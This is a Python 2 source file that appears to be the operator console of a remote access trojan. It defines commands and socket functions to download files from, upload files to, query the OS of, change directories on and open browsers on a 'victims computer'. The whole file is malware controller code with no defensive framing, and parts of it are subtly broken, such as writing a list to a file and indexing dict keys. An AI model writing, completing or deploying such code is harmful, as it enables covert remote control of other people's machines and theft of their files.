from os import name, system
from colorama import Fore
import os


INFO = Fore.CYAN + '[*]' + Fore.RESET
ERR = Fore.RED + '[!]' + Fore.RESET


commands = {
        'help': 'show this message',
        'quit': 'close session and exit',
        'download': 'download some file from victims computer (download <file> <path for saving>)',
        'upload': 'upload some file at victims computer (upload <file> <path for saving>)',
        'clear': 'clear terminal',
        'get_os': 'get information about victims OS',
        'cd': 'change victims working directory (chdir <path>)',
        'cd_local': 'change directory at your machine',
        'open_browser': 'open webbrowser at victims computer (open_browser <url>)'
    }

def get_help (command):
    if command == 'null':
        for i in range (len (commands)):
            print commands.keys()[i] + ' - ' + commands [commands.keys()[i]]
    else:
        if commands[command] != None:
            print command + ' - ' + commands [command]
            
            
def clear ():
    if name == 'posix':
        system ('clear')
    else:
        system ('cls')

def download_file (socket, file, path):
    try:
        socket.send ('dload:' + file)
        file_content = socket.recv (1024).split (':')[0:]
        f = open (path, 'w')
        f.write (file_content)
        f.close ()
        print INFO + ' File downloaded!'
        socket.send ('revers')
    except:
        print ERR + ' Cant download file!'
        socket.send ('revers')
        
def upload_file (socket, file, path_file_to_load):
    try:
        cont = ''
        f = open (file, 'r')
        for i in f:
            cont += i
        socket.sendall ('uload:' + cont)
        if socket.recv (1024) == 'tit':
            socket.send (path_file_to_load)
        if socket.recv (1024) == 'suc':
            print INFO + ' File Uploaded!'
        else:
            print ERR + ' Cant upload file!'
            socket.send ('revers')
    except:
        print ERR + ' Cant upload file!'
        socket.send ('revers')
        
def get_os_info (socket):
    socket.send ('getos')

def chdir (socket, path):
    socket.send ('chdir:' + path)
    
def chdir_local (socket, path):
    os.chdir (path)
    socket.send ('revers')
        
        
            